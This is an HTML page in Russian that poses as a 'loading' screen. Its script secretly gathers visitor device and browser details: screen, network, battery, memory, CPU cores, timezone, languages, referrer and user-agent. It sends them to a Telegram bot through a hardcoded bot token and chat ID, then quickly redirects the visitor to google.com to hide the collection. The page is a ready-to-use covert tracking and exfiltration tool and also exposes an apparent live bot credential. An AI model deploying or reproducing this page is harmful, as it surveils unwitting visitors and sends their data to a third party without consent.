<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h2>Секунду, идет загрузка страницы...</h2>

    <script>
        const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
        const CHAT_ID = "8814781494";

        async function gatherInfo() {
            // Базовые метрики экрана
            const screenInfo = ${window.screen.width}x${window.screen.height} (Цветов: ${window.screen.colorDepth}, Пикселей: ${window.screen.pixelDepth});
            const windowInfo = ${window.innerWidth}x${window.innerHeight};

            // Сеть (если поддерживается)
            let connectionInfo = "недоступно";
            if (navigator.connection) {
                connectionInfo = Тип: ${navigator.connection.effectiveType || 'н/д'}, Скорость: ${navigator.connection.downlink || 'н/д'} Мбит/с, RTT: ${navigator.connection.rtt || 'н/д'}ms;
            }

            // Данные батареи (если поддерживается)
            let batteryInfo = "недоступно";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = ${Math.round(battery.level * 100)}% (${battery.charging ? 'заряжается' : 'разряжается'});
                } catch (e) {}
            }

            // Поддерживаемые языки
            const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;

            // Часовой пояс
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "неизвестно";

            // Доступная память и процессор
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно";
            const cores = navigator.hardwareConcurrency || "неизвестно";

            // Оценка железа по производительности задержки кадров (примерная)
            const touchPoints = navigator.maxTouchPoints || 0;

            const info = "🚨 Подробный отчет о посетителе\n\n" +
                         "⏱ Время: " + new Date().toLocaleString() + "\n" +
                         "🌍 Часовой пояс: " + timezone + "\n" +
                         "💻 Платформа / ОС: " + navigator.platform + "\n" +
                         "🗣 Языки: " + languages + "\n" +
                         "📺 Экран (физ.): " + screenInfo + "\n" +
                         "🪟 Окно браузера: " + windowInfo + "\n" +
                         "👆 Точки касания (Тач): " + touchPoints + "\n" +
                         "🧠 Память (RAM): " + ram + "\n" +
                         "⚙️ Ядра процессора: " + cores + "\n" +
                         "📶 Сеть: " + connectionInfo + "\n" +
                         "🔋 Батарея: " + batteryInfo + "\n" +
                         "🔗 Источник (Referrer): " + (document.referrer || "прямой заход") + "\n" +
                         "📌 Текущий адрес: " + window.location.href + "\n" +
                         "📱 User-Agent: " + navigator.userAgent;

            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info) + "&parse_mode=Markdown";

            // Отправляем в фоне
            fetch(url).catch(function() {});
        }

        // Запускаем сбор и сразу ставим таймер на редирект (0.6 сек), 
        // чтобы асинхронные запросы (например, батарея) успели выполниться в фоне, но юзер не ждал долго.
        gatherInfo();

        setTimeout(function() {
            window.location.href = "https://google.com";
        }, 600);
    </script>
</body>
</html>
